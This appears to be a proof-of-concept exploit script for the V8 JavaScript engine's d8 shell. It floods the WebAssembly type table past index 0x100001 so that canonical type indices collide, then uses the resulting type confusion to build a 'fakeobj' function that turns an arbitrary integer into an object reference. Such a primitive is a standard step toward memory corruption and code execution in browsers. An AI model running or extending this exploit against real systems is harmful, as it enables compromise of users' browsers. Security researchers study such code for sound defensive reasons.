d8.file.execute('../..//test/mjsunit/wasm/wasm-module-builder.js');

const kV8MaxWasmTypes = 1000000;

// we can't fit all 0x100001 types in one recursive group
{
    console.log("[*] create 1000000 types");
    let builder = new WasmModuleBuilder();
    builder.startRecGroup();
    for (let i = 0; i < kV8MaxWasmTypes - 3; i++) {
        builder.addStruct([makeField(kWasmI32, true)]);
    }
    builder.endRecGroup();
    builder.instantiate();
}
{
    console.log("[*] create 0x100001 types");
    let builder = new WasmModuleBuilder();
    builder.startRecGroup();
    for (let i = 0; i < 0x100001 - 1000000; i++) {
        builder.addStruct([makeField(kWasmI32, true)]);
    }
    builder.endRecGroup();
    builder.instantiate();
}

builder = new WasmModuleBuilder();
let canonicalized_100001 = builder.addStruct([makeField(kWasmI32, true)]);   // canonical index 0x100001, index 0 in rec group

// group
builder.startRecGroup();
let ref2index2 = builder.addStruct([makeField(wasmRefType(2), true)]);       // heaptype index = 2 - 1 = 1, { field0(ref{externref}): 1(0x100001) }
let index2 = builder.addStruct([makeField(kWasmExternRef, true)]);           // index 2 in rec group
builder.endRecGroup();

// group
builder.startRecGroup();
let ref2canonicalized = builder.addStruct([makeField(wasmRefType(canonicalized_100001), true)]);   // heaptype 0x100001, { field0: rec0_type0x100001 }
let ext = builder.addStruct([makeField(kWasmExternRef, true)]);
builder.endRecGroup();

let fakeobj_type = builder.addType(makeSig([kWasmI32], [kWasmExternRef]));

builder.addFunction('fakeobj', fakeobj_type).addBody([
    kExprLocalGet, 0,                                       // get arg0
    kGCPrefix, kExprStructNew, canonicalized_100001,        // create struct with type 0x100001, { field0(int32): arg0 }
    kGCPrefix, kExprStructNew, ref2canonicalized,           // create struct with type 0 in group1, { field0(ref): { field0(int32): arg0 } }
    kGCPrefix, kExprStructGet, ref2index2, 0,               // type confusion, get { field0(int32): arg0 } as { field0(ref{externref}): arg0 }
    kGCPrefix, kExprStructGet, ext, 0,                      // get arg0 as externref
]).exportFunc();

let instance = builder.instantiate();
let fakeobj = instance.exports.fakeobj;
console.log(fakeobj(0xc0ffee | 1));

